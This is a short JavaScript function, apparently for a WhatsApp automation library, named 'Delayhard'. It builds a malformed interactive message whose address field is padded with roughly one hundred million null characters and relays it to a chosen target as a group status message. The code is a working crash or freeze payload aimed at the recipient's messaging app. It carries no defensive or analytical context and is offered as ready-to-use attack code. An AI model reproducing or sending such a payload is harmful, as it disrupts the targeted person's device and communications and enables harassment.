async function Delayhard(sock, target) {
  const hardelay = {
    interactiveResponseMessage: {
            body: {
              text: "RAYZEN NIH BOSS",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"999999","building_name":"","landmark_area":"18","address":"Amp4","tower_number":"","city":"","name":"Amp4","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X${"\u0000".repeat(99999999)}"}}`,
              version: 3
            }
           }
  };

await sock.relayMessage(target, {
   groupStatusMessageV2: {
     message: hardelay
    }
  }, {
    participant: { jid: target }
  })
}